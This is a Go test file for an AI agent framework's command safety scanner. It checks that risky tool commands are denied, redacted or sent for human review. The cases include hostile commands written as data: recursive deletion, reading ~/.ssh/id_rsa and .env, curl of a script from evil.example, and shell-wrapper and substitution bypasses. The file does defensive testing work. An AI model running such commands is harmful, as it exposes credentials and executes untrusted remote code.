//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func TestDefaultScanner_AcceptanceCases(t *testing.T) {
	scanner := MustDefaultScanner(Policy{
		NetworkAllowlist: []string{"proxy.golang.org", ".golang.org"},
	})
	cases := []struct {
		name     string
		req      ScanRequest
		decision Decision
		ruleID   string
		blocked  bool
		redacted bool
	}{
		{
			name: "safe_go_test",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "go test ./...",
			},
			decision: DecisionAllow,
			ruleID:   "evaluation.none",
		},
		{
			name: "dangerous_rm_rf",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "rm -rf /tmp/x",
			},
			decision: DecisionDeny, ruleID: "command.dangerous_delete",
			blocked: true,
		},
		{
			name: "read_ssh_key",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny, ruleID: "path.sensitive_credentials",
			blocked: true, redacted: true,
		},
		{
			name: "read_env_file",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "cat .env",
			},
			decision: DecisionDeny, ruleID: "path.secret_file",
			blocked: true, redacted: true,
		},
		{
			name: "network_non_allowlisted",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "curl https://evil.example/a.sh",
			},
			decision: DecisionDeny, ruleID: "network.non_allowlisted_domain",
			blocked: true,
		},
		{
			name: "network_allowlisted",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "curl https://proxy.golang.org",
			},
			decision: DecisionAllow,
			ruleID:   "evaluation.none",
		},
		{
			name: "shell_wrapper_bypass",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "sh -c 'curl https://evil.example'",
			},
			decision: DecisionDeny, ruleID: "shell.wrapper",
			blocked: true,
		},
		{
			name: "command_substitution",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "echo $(cat .env)",
			},
			decision: DecisionDeny, ruleID: "shell.expansion",
			blocked: true, redacted: true,
		},
		{
			name: "pipeline_mixed",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "echo ok | wc -c",
			},
			decision: DecisionAllow,
			ruleID:   "evaluation.none",
		},
		{
			name: "dependency_install",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "npm install left-pad",
			},
			decision: DecisionAsk, ruleID: "dependency.install",
			blocked: true,
		},
		{
			name: "long_sleep",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "sleep 99999",
			},
			decision: DecisionDeny, ruleID: "resource.long_running",
			blocked: true,
		},
		{
			name: "large_output",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "yes | head -n 1000000",
			},
			decision: DecisionAsk, ruleID: "resource.large_output",
			blocked: true,
		},
		{
			name: "host_pty",
			req: ScanRequest{
				ToolName: "exec_command", Backend: BackendHost,
				Command: "python -i", TTY: true,
			},
			decision: DecisionAsk, ruleID: "host.pty_session",
			blocked: true,
		},
		{
			name: "human_review_custom",
			req: ScanRequest{
				ToolName: "custom_downloader", Backend: BackendUnknown,
				Arguments: []byte(`{"text":"download https://example.invalid/a.sh"}`),
			},
			decision: DecisionNeedsHumanReview, ruleID: "unknown.requires_review",
			blocked: true,
		},
		{
			name: "unknown_dangerous_command",
			req: ScanRequest{
				ToolName: "mcp_call", Backend: BackendUnknown,
				Arguments: []byte(`{"cmd":"rm -rf /tmp/x"}`),
			},
			decision: DecisionNeedsHumanReview, ruleID: "unknown.dangerous_command",
			blocked: true,
		},
		{
			name: "unknown_sensitive_path",
			req: ScanRequest{
				ToolName: "mcp_call", Backend: BackendUnknown,
				Arguments: []byte(`{"path":"~/.ssh/id_rsa"}`),
			},
			decision: DecisionNeedsHumanReview, ruleID: "unknown.sensitive_path",
			blocked: true, redacted: true,
		},
		{
			name: "cwd_relative_sensitive_path",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "cat id_rsa", Cwd: "~/.ssh",
			},
			decision: DecisionDeny, ruleID: "path.sensitive_credentials",
			blocked: true, redacted: true,
		},
		{
			name: "sensitive_cwd_no_argument_command",
			req: ScanRequest{
				ToolName: "workspace_exec", Backend: BackendWorkspace,
				Command: "ls", Cwd: "~/.ssh",
			},
			decision: DecisionDeny, ruleID: "path.sensitive_credentials",
			blocked: true, redacted: true,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(context.Background(), tc.req)
			require.NoError(t, err)
			require.Equal(t, tc.decision, report.Decision)
			require.Equal(t, tc.ruleID, report.RuleID)
			require.Equal(t, tc.blocked, report.Blocked)
			require.Equal(t, tc.redacted, report.Redacted)
			require.NotEmpty(t, report.Evidence)
			require.NotEmpty(t, report.Recommendation)
		})
	}
}

func TestDefaultScanner_RedactsReportCommandAndEvidence(t *testing.T) {
	scanner := MustDefaultScanner(Policy{})
	report, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  "cat ~/.ssh/id_rsa && cat .env",
	})
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	require.True(t, report.Redacted)
	require.NotContains(t, report.Command, "~/.ssh")
	require.NotContains(t, report.Command, "id_rsa")
	require.NotContains(t, report.Command, ".env")
	require.NotContains(t, report.Evidence, "~/.ssh")
	require.NotContains(t, report.Evidence, "id_rsa")
	require.NotContains(t, report.Evidence, ".env")
}

func TestDefaultScanner_SafeSampleFalsePositiveRate(t *testing.T) {
	scanner := MustDefaultScanner(Policy{
		NetworkAllowlist: []string{"proxy.golang.org", ".golang.org"},
	})
	safeCommands := []string{
		"go test ./...",
		"go test ./tool/safety",
		"go list ./...",
		"echo ok",
		"printf hello",
		"pwd",
		"ls -la",
		"cat README.md",
		"grep agent README.md",
		"wc -l README.md",
	}
	var falsePositives int
	for _, command := range safeCommands {
		report, err := scanner.Scan(context.Background(), ScanRequest{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  command,
		})
		require.NoError(t, err)
		if report.Decision != DecisionAllow {
			falsePositives++
		}
	}
	require.LessOrEqual(t, falsePositives, 1)
}

func TestDefaultScanner_PerformanceSamples(t *testing.T) {
	scanner := MustDefaultScanner(Policy{})
	lines := make([]string, 0, 500)
	segments := make([]string, 0, 500)
	for i := 0; i < 500; i++ {
		lines = append(lines, "echo ok")
		segments = append(segments, "echo ok")
	}
	start := time.Now()
	_, err := scanner.Scan(context.Background(), ScanRequest{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		Language: "bash",
		Code:     strings.Join(lines, "\n"),
	})
	require.NoError(t, err)
	require.LessOrEqual(t, time.Since(start), time.Second)

	start = time.Now()
	_, err = scanner.Scan(context.Background(), ScanRequest{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  strings.Join(segments, "; "),
	})
	require.NoError(t, err)
	require.LessOrEqual(t, time.Since(start), time.Second)
}
